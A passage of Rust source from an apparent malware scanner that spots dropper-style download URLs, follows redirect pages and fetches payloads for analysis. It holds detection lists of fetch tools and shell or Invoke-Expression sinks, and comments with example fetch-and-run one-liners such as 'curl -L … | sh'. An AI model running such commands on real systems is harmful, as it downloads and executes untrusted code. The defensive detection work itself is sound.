/// find and would just pay a wasted parse. Declared references are read from the
/// report regardless, so nothing is lost for large roots.
const ROOT_HUNT_MAX_BYTES: u64 = 4 * 1024 * 1024;

/// The HTTP client and blob cache, built once per process and shared across
/// every analyzed file (and rayon worker). Fetch is opt-in, so this is
/// initialized lazily on the first fetching analysis. `None` means the client
/// or cache couldn't be created — fetching degrades to a no-op.
struct Resources {
    net: HttpFetch,
    cache: BlobCache,
}

fn shared_resources() -> Option<&'static Resources> {
    static RESOURCES: OnceLock<Option<Resources>> = OnceLock::new();
    RESOURCES
        .get_or_init(|| match (HttpFetch::new(), open_blob_cache()) {
            (Ok(net), Ok(cache)) => Some(Resources {
                net: net.with_max_bytes(settings().max_fetch_bytes),
                cache,
            }),
            (Err(e), _) => {
                tracing::warn!("fetch disabled: http client unavailable: {e:#}");
                None
            }
            (_, Err(e)) => {
                tracing::warn!("fetch disabled: blob cache unavailable: {e:#}");
                None
            }
        })
        .as_ref()
}

/// URL suffixes that are normally pages, API responses, or other site
/// resources rather than a payload a dropper would retrieve.
const NON_PAYLOAD_URL_EXTENSIONS: &[&str] = &[
    "asp",
    "aspx",
    "atom",
    "avif",
    "bmp",
    "cfm",
    "cgi",
    "css",
    "csv",
    "dtd",
    "gif",
    "htm",
    "html",
    "ico",
    "jpeg",
    "jpg",
    "json",
    "log",
    "md",
    "pdf",
    "php",
    "png",
    "rss",
    "svg",
    "txt",
    "webmanifest",
    "webp",
    "xml",
    "xhtml",
    "yaml",
    "yml",
];

/// Path components that make a URL explicitly file/download-shaped. These
/// allow extensionless payload names and file routes on otherwise API-shaped
/// hosts, while a bare `/download` still fails the basename check.
const DOWNLOAD_URL_PATH_COMPONENTS: &[&str] = &[
    "archive",
    "archives",
    "attachment",
    "attachments",
    "blob",
    "download",
    "downloads",
    "file",
    "files",
    "raw",
    "release",
    "releases",
    "resolve",
];

/// Path components that are strong signs of an API or service endpoint.
const API_URL_PATH_COMPONENTS: &[&str] = &[
    "api", "graphql", "health", "lookup", "metrics", "oauth", "query", "rpc", "search", "status",
    "token",
];

/// Whether a path component reads as a version rather than a filename: every
/// dot-separated segment is digits, with at least one dot and an optional
/// leading `v` (`0.40.0`, `v2.1`, `10.0.1`). A bare `v1` or a plain number has
/// no dot and keeps whatever the surrounding rules decide.
///
/// Deliberately strict about the tail. Recognizing a pre-release suffix as part
/// of the version means splitting at `-`, which throws away everything after —
/// including a real extension. A Go module's
/// `v0.0.0-20260823143148-1fb3b878e2fb.zip` then reads as version `0.0.0` and
/// the artifact stops being fetched. Requiring every segment to be numeric can
/// only ever miss a version, never swallow a file: anything ending in an
/// alphabetic extension fails the test by construction.
fn is_version_shaped(component: &str) -> bool {
    let core = component.strip_prefix(['v', 'V']).unwrap_or(component);
    core.contains('.')
        && core
            .split('.')
            .all(|part| !part.is_empty() && part.bytes().all(|b| b.is_ascii_digit()))
}

/// Whether a discovered URL has a real network host. URL extraction also sees
/// relative paths, malformed authority strings, and single-label local names
/// such as `wpad`; none can identify a public download host. Public IP literals
/// of either family are valid, while DNS names must have at least two labels.
fn valid_discovered_url_host(url: &Url) -> bool {
    if !matches!(url.scheme(), "http" | "https") {
        return false;
    }
    let host = match hosts::url_host(url) {
        Some(UrlHost::Ip(ip)) => return public_ip(ip),
        Some(UrlHost::Domain(host)) => host,
        None => return false,
    };
    let host = host.strip_suffix('.').unwrap_or(host);
    host.len() <= 253
        && host.contains('.')
        && host.split('.').all(|label| {
            let bytes = label.as_bytes();
            !bytes.is_empty()
                && bytes.len() <= 63
                && bytes[0].is_ascii_alphanumeric()
                && bytes[bytes.len() - 1].is_ascii_alphanumeric()
                && bytes
                    .iter()
                    .all(|byte| byte.is_ascii_alphanumeric() || *byte == b'-')
        })
}

/// Whether a discovered URL still contains a source-template placeholder.
/// These appear in documentation and client code as repository and release
/// examples; fetching one can only produce an avoidable 4xx.
///
/// Three spellings, and the argument for the last two is the same: RFC 3986
/// admits neither a bare brace nor a `%` outside a two-hex-digit escape, so an
/// unencoded one is never a literal a server could serve — it is a slot some
/// renderer was supposed to fill. Recognizing only the shell `$` form let a
/// build script's `.../download/v{version}/{}` through to five certain 404s.
fn has_unexpanded_url_placeholder(url: &str) -> bool {
    // `$VERSION`, `${this.repositoryId}`
    let shell = url.as_bytes().windows(2).any(|pair| {
        pair[0] == b'$' && (pair[1] == b'{' || pair[1].is_ascii_alphabetic() || pair[1] == b'_')
    });
    // `{version}`, `{}`
    let brace = url.contains(['{', '}']);
    // `%s`, `%d`, Python's `%(version)s`
    let printf = url.split('%').skip(1).any(|after| {
        !after
            .as_bytes()
            .get(..2)
            .is_some_and(|escape| escape.iter().all(u8::is_ascii_hexdigit))
    });
    shell || brace || printf
}

/// Whether an IP literal is publicly routable enough to justify a discovered
/// fetch. This excludes RFC1918/private space and the other special-use ranges
/// that describe the scanner's host, a lab network, or documentation rather
/// than an external payload service.
fn public_ip(ip: std::net::IpAddr) -> bool {
    // Only an IPv4-*mapped* address is an IPv4 host in disguise; the
    // deprecated IPv4-compatible form would turn `::1` into `0.0.0.1`.
    if let std::net::IpAddr::V6(ipv6) = ip
        && let Some(ipv4) = ipv6.to_ipv4_mapped()
    {
        return public_ip(std::net::IpAddr::V4(ipv4));
    }
    match ip {
        std::net::IpAddr::V4(ip) => {
            let octets = ip.octets();
            !ip.is_private()
                && !ip.is_loopback()
                && !ip.is_link_local()
                && !ip.is_unspecified()
                && !ip.is_broadcast()
                && !ip.is_multicast()
                && !(octets[0] == 100 && (64..=127).contains(&octets[1]))
                && !(octets[0] == 192 && octets[1] == 0 && octets[2] == 0)
                && !(octets[0] == 192 && octets[1] == 0 && octets[2] == 2)
                && !(octets[0] == 198 && octets[1] == 51 && octets[2] == 100)
                && !(octets[0] == 203 && octets[1] == 0 && octets[2] == 113)
                && !(octets[0] == 198 && (18..=19).contains(&octets[1]))
                && !(octets[0] == 192 && octets[1] == 88 && octets[2] == 99)
                && octets[0] < 224
        }
        std::net::IpAddr::V6(ip) => {
            let segments = ip.segments();
            !ip.is_loopback()
                && !ip.is_unspecified()
                && !ip.is_multicast()
                && (segments[0] & 0xfe00) != 0xfc00
                && (segments[0] & 0xffc0) != 0xfe80
                && (segments[0] & 0xffc0) != 0xfec0
                && !(segments[0] == 0x2001 && segments[1] == 0x0db8)
        }
    }
}

/// Whether a discovered URL looks enough like a dropper download to spend a
/// network request on it.
///
/// This is deliberately a shape check, not a content or reputation check:
/// direct scans still fetch exactly what the operator names, and a URL with a
/// plausible payload basename remains eligible even when its host is unknown.
fn looks_like_dropper_download_url(url: &Url) -> bool {
    if !matches!(url.scheme(), "http" | "https") {
        return false;
    }
    let path = url.path();
    // A path ending in `/` names a directory, not a file: whatever a server
    // returns for it is an index or a landing page, never the download itself.
    // `https://pypi.org/project/diffusers/0.40.0/` was being fetched as a
    // payload because the trailing component parsed as a filename.
    if path.ends_with('/') {
        return false;
    }
    let components: Vec<&str> = path
        .split('/')
        .filter(|component| !component.is_empty())
        .collect();
    let Some(filename) = components.last().copied() else {
        return false;
    };
    if filename == "." || filename == ".." {
        return false;
    }
    // A version is not a file. `0.40.0`, `v2.1`, `1.2.3-rc1` all end in what
    // looks like an extension, so the dotted-basename test reads them as
    // downloads and pulls project pages, release-tag pages, and API version
    // roots. Nothing named this way is an artifact.
    if is_version_shaped(filename) {
        return false;
    }

    let filename_lower = filename.to_ascii_lowercase();
    let has_dot = filename_lower.contains('.');
    let extension = filename_lower
        .rsplit_once('.')
        .and_then(|(stem, extension)| {
            (!stem.is_empty() && !extension.is_empty()).then_some(extension)
        });
    let has_payload_extension = extension.is_some_and(|extension| {
        extension.len() <= 12
            && extension.bytes().all(|byte| byte.is_ascii_alphanumeric())
            && !NON_PAYLOAD_URL_EXTENSIONS.contains(&extension)
    });
    // A download route names the file that follows it, so the route word
    // cannot also be the basename: `/repos/o/r/releases` is the listing API,
    // not the asset, and unauthenticated it only ever answers 403.
    if DOWNLOAD_URL_PATH_COMPONENTS.contains(&filename_lower.as_str()) {
        return false;
    }
    let explicit_download_path = components.iter().any(|component| {
        DOWNLOAD_URL_PATH_COMPONENTS
            .iter()
            .any(|route| component.eq_ignore_ascii_case(route))
    });
    let extensionless_download = !has_dot && explicit_download_path && components.len() >= 2;

    // A basename with a plausible extension is enough; an extensionless name
    // needs an explicit file/download route and at least one component before
    // the basename (`/download` itself is still just an endpoint).
    if !has_payload_extension && !extensionless_download {
        return false;
    }

    // An API host or endpoint with a file-shaped response is still allowed
    // when the URL says it is fetching a file. This keeps routes such as
    // `/releases/download/...`, `/raw/...`, and Telegram-style `/file/...`
    // eligible while dropping `/api/v1/models`, `/graphql`, and similar
    // service calls (which already fail the basename test in most cases).
    let api_host = url
        .host_str()
        .and_then(|host| host.split('.').next())
        .is_some_and(|label| label.eq_ignore_ascii_case("api"));
    let api_path = components.iter().any(|component| {
        API_URL_PATH_COMPONENTS
            .iter()
            .any(|route| component.eq_ignore_ascii_case(route))
    });
    !(api_host || api_path) || explicit_download_path
}

/// A URL fetched directly into `IEX`/`Invoke-Expression` is a dropper edge even
/// when its final path component is opaque (`/abc123`) or extensionless. The
/// response is executable by construction, and these one-line fetch/evaluate
/// forms are uncommon enough that following them is more useful than applying
/// the ordinary download-shape filter. The evidence is the recognizer's full
/// command line, so an unrelated URL elsewhere in a file does not qualify.
fn is_eval_pipeline_url(reference: &Reference) -> bool {
    if reference.kind != RefKind::UrlFetch {
        return false;
    }
    if !reference.evidence.contains('|') {
        return false;
    }

    let command_matches = |candidates: &[&str]| {
        reference.evidence.split_whitespace().any(|word| {
            let word = word.trim_matches(|c: char| !c.is_ascii_alphanumeric() && c != '-');
            let lowered = word.to_ascii_lowercase();
            let normalized = lowered
                .strip_suffix(".exe")
                .unwrap_or(&lowered)
                .replace('-', "");
            candidates.iter().any(|candidate| normalized == *candidate)
        })
    };

    let fetch = command_matches(&[
        "irm",
        "iwr",
        "curl",
        "wget",
        "invokerestmethod",
        "invokewebrequest",
    ]);
    let execution_sink = command_matches(&[
        "iex",
        "invokeexpression",
        "sh",
        "bash",
        "zsh",
        "ash",
        "dash",
        "cmd",
        "powershell",
        "pwsh",
    ]);
    fetch && execution_sink
}

/// A URL a fetch command saves to a named file (`curl -o f URL`, `wget -O f
/// URL`, `iwr URL -OutFile f`) is a staged-download edge even when its path is
/// an opaque API route: the command states the response is an artifact to keep,
/// which is exactly the download-then-execute dropper shape. `wget -qO-` and
/// `-o -` write to stdout and do not qualify; a pipe into a shell is
/// [`is_eval_pipeline_url`]'s case. Flags are only read between a fetch command
/// and the end of its pipeline stage, so `unzip -o` after `&&` does not count.
fn is_download_to_file_url(reference: &Reference) -> bool {
    if reference.kind != RefKind::UrlFetch {
        return false;
    }
    let mut words = reference
        .evidence
        .split_whitespace()
        .map(|word| word.trim_matches(['"', '\'', '^']))
        .peekable();
    let mut in_fetch = false;
    while let Some(word) = words.next() {
        let lowered = word.to_ascii_lowercase();
        let command = lowered.strip_suffix(".exe").unwrap_or(&lowered);
        if matches!(
            command,
            "curl" | "wget" | "iwr" | "invoke-webrequest" | "invoke-restmethod" | "irm"
        ) {
            in_fetch = true;
            continue;
        }
        if matches!(word, "|" | "||" | "&&" | "&") || word.ends_with(';') {
            in_fetch = false;
            continue;
        }
        if !in_fetch {
            continue;
        }
        // The value an output flag names: attached (`-ofile`, `--output=f`,
        // `-qO-`) or the following word.
        let value = if let Some(long) = lowered.strip_prefix("--") {
            match long.split_once('=') {
                Some(("output" | "output-document", value)) => Some(value.to_string()),
                None if matches!(long, "output" | "output-document") => None,
                _ => continue,
            }
        } else if lowered == "-outfile" {
            None
        } else if let Some(cluster) = word.strip_prefix('-') {
            // A short-flag cluster such as `-sLo` or `-qO-`: find the output
            // flag among leading letters; what follows it is its value.
            let Some((_, flag_and_value)) = cluster
                .find(['o', 'O'])
                .and_then(|at| cluster.split_at_checked(at))
                .filter(|(flags, _)| flags.bytes().all(|b| b.is_ascii_alphabetic()))
            else {
                continue;
            };
            let attached = flag_and_value.get(1..).unwrap_or_default();
            (!attached.is_empty()).then(|| attached.to_string())
        } else {
            continue;
        };
        let value = value.or_else(|| words.peek().map(|next| (*next).to_string()));
        if value.is_some_and(|value| !value.is_empty() && value != "-") {
            return true;
        }
    }
    false
}

/// User-Agents of the command-line clients a staged download names. Pinned to
/// current releases; a staging server gates on the product token, not the
/// exact version.
const CURL_USER_AGENT: &str = "curl/8.7.1";
const WGET_USER_AGENT: &str = "Wget/1.21.4";
const POWERSHELL_USER_AGENT: &str =
    "Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.4648";

/// The User-Agent the command that names a URL reference would send.
///
/// Staging servers routinely answer only the client their one-liner uses: a
/// C2 behind `curl -L … | sh` returns 403 to a browser or a scanner that
/// announces itself, so fetching as `fletch` retrieves nothing. A redirect
/// destination continues a download chain and is fetched as curl, the client
/// such chains overwhelmingly use. `None` (no fetch command in the evidence)
/// keeps fletch's own agent.
fn client_user_agent(reference: &Reference) -> Option<&'static str> {
    if reference.kind != RefKind::UrlFetch {
        return None;
    }
    if is_redirect_destination(reference) {
        return Some(CURL_USER_AGENT);
    }
    reference.evidence.split_whitespace().find_map(|word| {
        let word = word
            .trim_matches(|c: char| !c.is_ascii_alphanumeric() && c != '-')
            .to_ascii_lowercase();
        match word.strip_suffix(".exe").unwrap_or(&word) {
            "curl" => Some(CURL_USER_AGENT),
            "wget" => Some(WGET_USER_AGENT),
            "iwr" | "irm" | "invoke-webrequest" | "invoke-restmethod" => {
                Some(POWERSHELL_USER_AGENT)
            }
            _ => None,
        }
    })
}

/// A fetch backend that requests each URL with the User-Agent of the client
/// that names it (see [`client_user_agent`]), keyed by locator. Only a plain
/// GET is dressed so; every other request — one carrying headers of its own,
/// one asking for any status, a POST — passes through unchanged.
struct AsClient<'a> {
    net: &'a HttpFetch,
    agents: HashMap<String, &'static str>,
}

impl Fetch for AsClient<'_> {
    fn send(&self, request: &Request<'_>) -> Result<Fetched, FetchError> {
        let plain =
            request.method == Method::Get && request.headers.is_empty() && !request.any_status;
        match self.agents.get(request.url) {
            Some(&agent) if plain => {
                let headers = [("User-Agent", agent)];
                let mut request = *request;
                request.headers = &headers;
                self.net.send(&request)
            }
            _ => self.net.send(request),
        }
    }

    fn allows_oci(&self) -> bool {
        self.net.allows_oci()
    }
}

/// [`Reference::source`] for a URL that a fetched redirect page names as its
/// destination (see [`redirect_destinations`]). A tag in a text field, because
/// next-hop references are fletch's type and ride the analysis cache as such;
/// [`is_redirect_destination`] is the one place that reads it.
const REDIRECT_DESTINATION_SOURCE: &str = "redirect-destination";

/// Whether a fetched redirect page named this reference as its destination.
fn is_redirect_destination(r: &Reference) -> bool {
    r.source == REDIRECT_DESTINATION_SOURCE
}

/// Redirect pages larger than this are real sites, not an interstitial.
const REDIRECT_PAGE_MAX_BYTES: usize = 1024 * 1024;

/// Most redirect pages a chain may pass through before depth accounting
/// resumes; bounds the extra hops [`orchestrate`]'s redirect credit can grant.
const MAX_REDIRECT_HOPS: u8 = 3;

/// Destinations an HTML redirect page sends its visitor to: a
/// `<meta http-equiv=refresh content="0; url=…">`, a URL-shortener
/// interstitial's hidden destination field (`<input type=hidden id=long_url
/// value=…>`), or a script's `location = "…"` / `location.replace("…")`.
///
/// A dropper URL behind a shortener (`curl -L https://short.link/x | sh`)
/// answers with such a page whenever the shortener shows a preview or safety
/// warning instead of a 3xx. The page is not the payload; the destination is.
/// Only absolute http(s) URLs are returned.
fn redirect_destinations(bytes: &[u8]) -> Vec<String> {
    if bytes.len() > REDIRECT_PAGE_MAX_BYTES {
        return Vec::new();
    }
    let html = String::from_utf8_lossy(bytes);
    let lower = html.to_ascii_lowercase();
    // An HTML document opens with markup; a script that merely mentions a
    // `<meta` tag in a comment or heredoc is not a redirect page.
    let head = lower
        .get(..lower.floor_char_boundary(1024))
        .unwrap_or_default();
    if !head
        .trim_start_matches(['\u{feff}', ' ', '\t', '\r', '\n'])
        .starts_with('<')
        || !["<!doctype html", "<html", "<head", "<meta"]
            .iter()
            .any(|marker| head.contains(marker))
    {
        return Vec::new();
    }
    let tags = |name: &'static str| {
        lower.match_indices(name).filter_map(|(at, _)| {
            let end = at + html.get(at..)?.find('>')?;
            html.get(at + name.len()..end)
                .filter(|body| body.starts_with(|c: char| c.is_ascii_whitespace()))
        })
    };

    let mut found = Vec::new();
    for tag in tags("<meta") {
        if html_attr(tag, "http-equiv").is_some_and(|v| v.eq_ignore_ascii_case("refresh"))
            && let Some(content) = html_attr(tag, "content")
            && let Some(at) = content.to_ascii_lowercase().find("url=")
            && let Some(url) = content.get(at + "url=".len()..)
        {
            found.push(url.trim_matches(|c: char| c.is_whitespace() || c == '\''));
        }
    }
    for tag in tags("<input") {
        let names_url = ["id", "name"].iter().any(|attr| {
            html_attr(tag, attr).is_some_and(|v| v.to_ascii_lowercase().contains("url"))
        });
        if names_url
            && html_attr(tag, "type").is_some_and(|v| v.eq_ignore_ascii_case("hidden"))
            && let Some(value) = html_attr(tag, "value")
        {
            found.push(value);
        }
    }
    for (at, keyword) in html.match_indices("location") {
        let Some(rest) = html.get(at + keyword.len()..) else {
            continue;
        };
        let rest = rest.strip_prefix(".href").unwrap_or(rest).trim_start();
        let rest = match rest.strip_prefix('=') {
            Some(assigned) if !assigned.starts_with('=') => assigned,
            Some(_) => continue,
            None => match rest
                .strip_prefix(".replace(")
                .or_else(|| rest.strip_prefix(".assign("))
            {
                Some(argument) => argument,
                None => continue,
            },
        }
        .trim_start();
        let Some(quote @ ('"' | '\'' | '`')) = rest.chars().next() else {
            continue;
        };
        // `rest` opens with the quote, so the literal is the second piece.
        if let Some(value) = rest.split(quote).nth(1) {
            found.push(value);
        }
    }

    let mut urls: Vec<String> = Vec::new();
    for url in found {
        let url = url.replace("\\/", "/").replace("&amp;", "&");
        let lowered = url.to_ascii_lowercase();
        if (lowered.starts_with("https://") || lowered.starts_with("http://"))
            && !urls.contains(&url)
        {
            urls.push(url);
        }
    }
    urls
}

/// The value of attribute `name` in the body of one HTML start tag, quoted or
/// bare. Attribute names match case-insensitively.
fn html_attr<'a>(tag: &'a str, name: &str) -> Option<&'a str> {
    // ASCII lowercasing keeps every byte offset, so `lower` indexes `tag`.
    let lower = tag.to_ascii_lowercase();
    let mut from = 0;
    while let Some(found) = lower.get(from..)?.find(name) {
        let start = from + found;
        from = start + name.len();
        if !lower
            .get(..start)
            .is_some_and(|before| before.ends_with(|c: char| c.is_ascii_whitespace()))
        {
            continue;
        }
        let Some(value) = tag.get(from..)?.trim_start().strip_prefix('=') else {
            continue;
        };
        let value = value.trim_start();
        return match value.chars().next() {
            Some(quote @ ('"' | '\'')) => value.split(quote).nth(1),
            _ => value.split(|c: char| c.is_ascii_whitespace()).next(),
        };
    }
    None
}

/// Mark the references a fetched redirect page names as its destination, so
/// the fetch gate follows them as the continuation of the edge that reached
/// the page. A destination the byte hunt missed (a script-escaped `https:\/\/`)
/// is added.
fn mark_redirect_destinations(bytes: &[u8], refs: &mut Vec<Reference>) {
    for url in redirect_destinations(bytes) {
        let existing = refs
            .iter_mut()
            .find(|r| matches!(&r.locator, RefLocator::Url(u) if *u == url));
        tracing::info!(url = %url, "fetched page is a redirect; following its destination");
        match existing {
            Some(reference) => {
                reference.kind = RefKind::UrlFetch;
                REDIRECT_DESTINATION_SOURCE.clone_into(&mut reference.source);
            }
            None => refs.push(Reference::new(
                RefLocator::Url(url.clone()),
                RefKind::UrlFetch,
                REDIRECT_DESTINATION_SOURCE,
                url,
            )),
        }
    }
}

/// A fetched dependency captured for upload to hopper as its own sample. Carries
/// the standalone analysis report cleave produced for the dependency's bytes (the
/// same report a first-hand `pkg:`/`url` scan yields, stripped and compacted),
/// plus the shas of every file in it — so the caller can harvest the dependency's
/// aggregate verdict from the embedded-classification pass it already runs over
/// the merged report, without re-running the model.
pub(crate) struct FetchedDependency {
    /// The reference locator (PURL or URL) the bytes were fetched from.
    pub locator: String,
    /// The URL the locator resolved to — drives the stored filename/type sniff.
    pub url: String,
    /// SHA-256 of the fetched bytes — the dependency's identity in hopper.
    pub content_sha: String,
    /// Size of the fetched bytes, recorded in the provenance sidecar.
    pub size: u64,
    /// The dependency's own compact cleave report as **JSON text** (`raw` for
    /// its `/api/result`). Text form on purpose: a `serde_json::Value` tree
    /// costs 3-6x the text size, and up to eight jobs' dependencies are
    /// co-resident in a worker from graft until their result POST — measured
    /// ~800 MB of retained `Value`s on the realworld worker benchmark. The
    /// envelope build parses it back transiently.
    pub raw: String,
}

/// Registry provenance materialized while walking a dependency graph.
///
/// This is separate from [`FetchedDependency`] because a dependency can have
/// notable registry findings even when its artifact is age-gated or removed and
/// therefore never fetched. `file_id` ties the record to the exact sidecar node
/// cleave analyzed, including composite-source attribution.
#[derive(Debug, Clone)]
pub(crate) struct DependencyRegistry {
    pub locator: String,
    pub provenance: crate::provenance::RegistryProvenance,
    pub file_id: u32,
    pub artifact_skip: Option<&'static str>,
}

/// What one fetch phase produced: the edges it recorded, the dependencies it
/// captured for upload, the registry documents it materialized, and the corpus
/// verdicts it adopted in place of analyzing bytes (keyed by content sha).
#[derive(Default)]
pub(crate) struct FetchOutcome {
    pub(crate) records: Vec<FetchRecord>,
    pub(crate) dependencies: Vec<FetchedDependency>,
    pub(crate) registries: Vec<DependencyRegistry>,
    pub(crate) adopted: HashMap<String, crate::corpus_precheck::Verdict>,
}

/// References to fetch, grouped by the sha256 of the file that declared them.
type Group = (String, Vec<Reference>);

/// Payloads a batch gathers before analyzing: enough to keep every core busy
/// across many small groups without holding a whole hop's analyzed reports in
/// memory.
const BATCH_PAYLOAD_TARGET: usize = 256;

/// Process-wide fetch knobs, read from the environment once.
#[derive(Debug, Clone, Copy)]
struct Knobs {
    /// `SCAN_FETCH_ONLY=1`: stop after the first group's network phase, before
    /// any analysis. A benchmark hatch: fetch tuning — depth, kind selection,
    /// age gating, concurrency — is about what we retrieve, and re-analyzing
    /// every payload to measure that turns a sub-minute experiment into a long
    /// one.
    fetch_only: bool,
    /// `SCAN_PAYLOAD_FANOUT`: whether payload analyses fan out across the pool.
    fanout: Fanout,
}

/// Whether a batch may fan its payload analyses across the Rayon pool.
///
/// Each fetched payload is a full cleave analysis, and cleave bounds how many
/// analyses fan out at once on the assumption that the throttled ones make
/// serial progress on their own blocking threads (see
/// [`cleave::pool_has_headroom`]). Dispatching them from `par_iter` breaks
/// that: a throttled payload analysis occupies a Rayon worker instead of
/// freeing one, and the dispatcher sits blocked-and-stealing on top. Measured
/// on a wedged worker 2026-09-04, that left every pool thread carrying 15-29
/// nested blocked joins with frames from unrelated analyses interleaved — one
/// runaway leaf then pinned the whole pool rather than one thread.
///
/// So fan out only when the pool has headroom — a lone analysis, or a scan
/// draining its queue, which are exactly the cases where fanning out is what
/// keeps the pool busy. Under saturation the payloads run inline on the
/// blocking thread that owns this batch, which is both the shape cleave's
/// throttle expects and no loss of machine utilization: the sibling analyses
/// already have every core. `SCAN_PAYLOAD_FANOUT=always` restores the
/// unconditional fan-out, `never` forces inline.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Fanout {
    WhenIdle,
    Always,
    Never,
}

impl Fanout {
    fn allowed(self) -> bool {
        match self {
            Self::Always => true,
            Self::Never => false,
            Self::WhenIdle => cleave::pool_has_headroom(),
        }
    }
}

fn knobs() -> &'static Knobs {
    static KNOBS: OnceLock<Knobs> = OnceLock::new();
    KNOBS.get_or_init(|| Knobs {
        fetch_only: std::env::var("SCAN_FETCH_ONLY").as_deref() == Ok("1"),
        fanout: match std::env::var("SCAN_PAYLOAD_FANOUT").as_deref() {
            Ok("always") => Fanout::Always,
            Ok("never") => Fanout::Never,
            _ => Fanout::WhenIdle,
        },
    })
}

/// The wall-clock ceiling on one artifact's fetch phase (`--fetch-timeout`).
///
/// The count and byte budgets bound how much a scan pulls, not how long pulling
/// takes: a wide tree of slow or rate-limited registries keeps every count
/// budget's room while holding the scan open indefinitely. Checked at group
/// boundaries — a group already fetching finishes, so no download is torn
/// mid-transfer and no partially-analyzed payload reaches the report — and once
/// passed it stays passed, so no later hop restarts the sweep.
#[derive(Debug)]
struct Deadline {
    /// `None` for no cap: a zero duration, or one no `Instant` can hold.
    at: Option<Instant>,
    limit: Duration,
    passed: bool,
}

impl Deadline {
    fn new(limit: Duration) -> Self {
        Self {
            at: (!limit.is_zero())
                .then(|| Instant::now().checked_add(limit))
                .flatten(),
            limit,
            passed: false,
        }
    }

    /// Whether the cap has passed, said once when it first does.
    fn passed(&mut self) -> bool {
        if !self.passed && self.at.is_some_and(|at| Instant::now() >= at) {
            self.passed = true;
            tracing::warn!(
                timeout_secs = self.limit.as_secs(),
                "fetch time cap reached (--fetch-timeout); remaining references not followed"
            );
        }
        self.passed
    }
}

/// One group's references after selection and the age gate: the ones to
/// fetch, and the registry records materialized for its dependencies.
struct GroupPlan {
    source_sha: String,
    selected: Vec<Reference>,
    registries: Vec<Gated>,
}

/// One group after the network phase.
struct GroupFetch {
    source_sha: String,
    registries: Vec<Gated>,
    landed: Vec<Landed>,
}

/// One group's analyses, aligned with its [`GroupFetch`]: a sub-report per
/// registry record and an [`Analyzed`] per landed reference, `None` where
/// there was nothing to graft.
struct GroupAnalysis {
    registries: Vec<Option<AnalysisReport>>,
    payloads: Vec<Option<Analyzed>>,
}

/// One selected reference after the network phase: the edge recorded for it,
/// and what the corpus already lets us skip — [`Standing::Analyze`] for
/// anything that went to the network.
struct Landed {
    reference: Reference,
    record: FetchRecord,
    standing: Standing,
}

/// Discover, fetch, and graft, following references up to `policy.depth` hops.
/// Mutates `report.files` in place with one node per fetched payload (and any
/// extracted members) and returns the fetch edge log plus the standalone report
/// captured for each fetched dependency. A disabled policy, an unavailable
/// cache/client, or zero references all yield empty logs.
///
/// `capture_deps` controls whether each fetched dependency's standalone report
/// is serialized and returned as a [`FetchedDependency`]. Those captures exist
/// only for hopper uploads and the dependency appendix of text/LLM renders — a
/// plain JSON scan with no upload target drops them unread, so skipping the
/// capture (and the downstream re-parse + per-dep model pass it feeds) is pure
/// saved work. Grafting, verdicts, and fetch edges are unaffected.
pub(crate) fn orchestrate(
    report: &mut AnalysisReport,
    root_path: &Path,
    policy: FetchPolicy,
    progress: bool,
    capture_deps: bool,
    zip_passwords: &[String],
) -> FetchOutcome {
    if !policy.enabled() {
        return FetchOutcome::default();
    }
    let Some(res) = shared_resources() else {
        return FetchOutcome::default();
    };
    // Hop 0's work-list: declared references from every file in the report plus
    // fletch's imperative discovery over the root sample's bytes. Each later hop
    // works from the references found *inside* the previous hop's payloads.
    let ci = if policy.ci {
        CiRefs::Include
    } else {
        CiRefs::Skip
    };
    let worklist = collect_references(report, root_path, ci);
    let mut session = FetchSession::new(
        report,
        &worklist,
        policy,
        res,
        Reporter::new(progress),
        capture_deps,
        zip_passwords,
    );
    session.run(report, worklist);
    session.finish(report)
}

/// One fetch phase: everything `orchestrate` carries from hop to hop.
struct FetchSession {
    policy: FetchPolicy,
    res: &'static Resources,
    knobs: &'static Knobs,
    /// hopper's corpus, when this process has one to ask.
    precheck: Option<Arc<Precheck>>,
    /// How fetched payloads are analyzed: with the same bloom short-circuit
    /// the top-level scan uses, so a trusted binary shipped inside a dependency
    /// isn't needlessly re-disassembled.
    opts: AnalysisOptions,
    /// A registry record is canonical JSON we serialized ourselves; its signal
    /// is entirely `registry.*` value facts and no YARA rule targets it.
    /// Disabling YARA here removed ~1400s of system time per scan — the
    /// engine's per-analysis setup, paid hundreds of times. Built once:
    /// cloning `AnalysisOptions` per record cost more user time than the YARA
    /// saving returned.
    registry_opts: AnalysisOptions,
    /// Opened on the first payload actually analyzed. Opening it derives the
    /// ruleset-version namespace, which calls `cleave::version_info` — and that
    /// spins up the YARA engine just to count rules. A scan that analyzes
    /// nothing (every reference age-gated or none present, the common `pkg:`
    /// case) must not pay that.
    acache: OnceLock<Option<AnalysisCache>>,
    /// Where the fetch phase's progress goes: the live in-place dependency tree
    /// on an interactive single-artifact scan, the streamed log above any active
    /// scan bar otherwise, or nothing for machine output. Shared across every
    /// hop, so transitive dependencies join the same view.
    reporter: Reporter,
    capture_deps: bool,
    /// One wall-clock reading for the whole run, so every dependency's age is
    /// judged against the same instant.
    now: u64,
    /// The host platform, for filtering off-host native-binary dependencies.
    host: (&'static str, &'static str),
    deadline: Deadline,
    budget: RootBudget,
    /// Loop guard: a locator is fetched at most once per run, so a chain that
    /// points back at an earlier stage can't cycle.
    seen: HashSet<String>,
    /// Newest-version gate: only the most recent version of a package in the
    /// dependency tree is fetched and analyzed. Deep ungated trees pin dozens
    /// of releases of the same packages (syn ×27, libc ×21 on the mx crate
    /// benchmark — 48% of its tree was older duplicates); analyzing every
    /// pinned release repeats near-identical work without detection value the
    /// newest release doesn't provide. Versionless references are exempt (they
    /// already resolve to the latest release), and the kept version is monotone
    /// across hops: once a release is scanned, an older sibling discovered in a
    /// later hop never resurrects the package.
    newest: HashMap<String, String>,
    /// Coordinates (`pkg:eco/name`) for which a version-pinned reference exists
    /// anywhere in the tree. A manifest range (`"puppeteer": "^10.4.0"`) reaches
    /// us version-stripped as a bare `pkg:npm/puppeteer` and would resolve to
    /// `dist-tags/latest` — a version the project never installs. When the
    /// co-located lockfile also pins the coordinate (`pkg:npm/puppeteer@10.4.2`),
    /// that pin is ground truth and must win, so the bare sibling is dropped.
    /// Monotone across hops, mirroring `newest`.
    pinned: HashSet<String>,
    /// A redirect page is not a stage. A shortener's safety or preview page
    /// stands where an HTTP 3xx would, naming the payload instead of being it,
    /// so a payload reached through one credits its group a hop and the chain
    /// behind the redirect keeps its full `policy.depth`. Keyed by the payload
    /// content sha that `merge_payload` groups next-hop references under.
    redirect_credit: HashMap<String, u8>,
